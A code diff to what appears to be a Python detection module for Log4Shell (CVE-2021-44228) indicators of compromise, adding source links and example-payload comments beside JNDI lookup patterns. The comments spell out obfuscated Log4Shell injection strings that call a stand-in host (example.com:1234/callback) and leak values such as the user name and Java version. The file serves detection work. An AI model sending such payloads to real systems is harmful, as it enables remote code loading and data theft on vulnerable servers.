@@ -768,7 +768,9 @@ LOG4J_IP_IOCS = {
     "45.155.205.233",
 }
 
-
+# Example sources:
+# - https://www.fastly.com/blog/new-data-and-insights-into-log4shell-attacks-cve-2021-44228
+# - https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/
 LOG4J_EXPLOIT_IOCS = {
     "jndi:ldap:/",
     "jndi:rmi:/",
@@ -779,12 +781,12 @@ LOG4J_EXPLOIT_IOCS = {
     "jndi:corba:/",
     "jndi:iiop:/",
     "jndi:${",
-    ":${lower:",
-    "${env:",
-    "${sys:",
-    "${java:",
-    "${date:",
-    "${::-j",
+    ":${lower:", # example: ${${lower:${lower:jndi}}:${lower:ldap}://example.com:1234/callback}
+    "${env:", # example: ${jndi:ldap://example.com:1234/callback/${env:USER}
+    "${sys:", # example: ${jndi:ldap://example.com:1234/callback/${sys:java.version}
+    "${java:", # example: ${jndi:ldap://example.com:1234/callback/${java:os}
+    "${date:", # example: ${jndi:ldap://example.com:1234/callback/${date:MM-dd-yyyy}
+    "${::-j", # example: ${${::-j}${::-n}di:${::-l}d${::-a}p://example.com:1234/callback}
 }
 
 # IOC Helper functions:
